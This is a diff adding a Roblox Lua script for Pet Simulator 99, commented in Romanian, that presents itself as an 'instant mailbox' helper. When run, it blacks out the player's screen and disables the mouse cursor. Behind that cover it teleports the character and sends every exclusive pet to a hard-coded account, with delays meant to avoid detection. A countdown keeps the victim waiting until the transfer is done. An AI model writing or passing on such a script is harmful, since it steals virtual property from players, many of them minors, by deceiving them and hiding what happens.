@@ -1,0 +1,88 @@
+-- =============================================  
+-- INSTANT MAILBOX SCRIPT (PET SIMULATOR 99)  
+-- Teleportare + Auto-Write "LOL" + Donate  
+-- =============================================  
+
+local player = game:GetService("Players").LocalPlayer  
+local targetUser = "pompeiulcelbatran" -- SCHIMBĂ AICI  
+
+-- 1. ECRAN NEGRU ȘI BLOCARE INPUT  
+local gui = Instance.new("ScreenGui")  
+gui.Name = "DarkScreenLock"  
+gui.DisplayOrder = 99999  
+gui.Parent = player:WaitForChild("PlayerGui")  
+
+local blackFrame = Instance.new("Frame")  
+blackFrame.Size = UDim2.new(1, 0, 1, 0)  
+blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)  
+blackFrame.Parent = gui  
+
+-- Dezactivează mouse + tastatură  
+local UIS = game:GetService("UserInputService")  
+UIS.MouseIconEnabled = false  
+UIS.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition  
+
+-- 2. TELEPORTARE LA MAILBOX (instant)  
+local function teleportToMailbox()  
+    -- Metoda 1: Folosește un event oficial (dacă există)  
+    -- game:GetService("ReplicatedStorage").Events.OpenMailbox:FireServer()  
+
+    -- Metoda 2: Teleportare forțată (coordonate custom)  
+    local mailboxPos = Vector3.new(100, 50, -30) -- *SCHIMBĂ POZIȚIA!*  
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then  
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(mailboxPos)  
+    end  
+end  
+
+-- 3. SCRIE "LOL" ÎN CUTIA DE MESAJ  
+local function writeLOL()  
+    -- Așteaptă să apară TextBox-ul (adjust delay dacă e necesar)  
+    task.wait(2)  
+
+    -- Caută TextBox-ul din GUI-ul mailbox-ului  
+    local textBox = game:GetService("CoreGui"):FindFirstChild("MailboxFrame")  
+        and game:GetService("CoreGui").MailboxFrame:FindFirstChild("MessageBox")  
+
+    if textBox then  
+        textBox.Text = "LOL" -- Scrie mesajul  
+    end  
+end  
+
+-- 4. DONEAZĂ TOATE EXCLUSIVELE  
+local function donateAll()  
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")  
+    local backpack = player.Backpack or player.Character  
+
+    for _, pet in ipairs(backpack:GetChildren()) do  
+        if pet:FindFirstChild("Exclusive") then  
+            ReplicatedStorage.Events.DonatePet:FireServer(targetUser, pet.Name)  
+            task.wait(0.3) -- Reduce șansele de detectare  
+        end  
+    end  
+end  
+
+-- 5. NUMĂRĂTOARE VIZUALĂ (15→0)  
+local countdownText = Instance.new("TextLabel")  
+countdownText.Size = UDim2.new(0, 200, 0, 50)  
+countdownText.Position = UDim2.new(0.5, -100, 0.5, -25)  
+countdownText.TextColor3 = Color3.new(1, 1, 1)  
+countdownText.TextScaled = true  
+countdownText.Font = Enum.Font.SourceSansBold  
+countdownText.Text = "15"  
+countdownText.Parent = blackFrame  
+
+-- EXECUTĂ TOATE ACȚIUNILE ÎN ORDINE  
+teleportToMailbox() -- Teleportare instant  
+writeLOL() -- Scrie "LOL"  
+task.wait(1) -- Așteaptă să se încarce mailbox-ul  
+donateAll() -- Trimite exclusivele  
+
+-- NUMĂRĂTOARE (doar pentru vizualizare)  
+for i = 15, 0, -1 do  
+    countdownText.Text = tostring(i)  
+    task.wait(1)  
+    if i == 0 then  
+        gui:Destroy() -- Închide ecranul negru  
+        UIS.MouseIconEnabled = true -- Reactivează input  
+    end  
+end
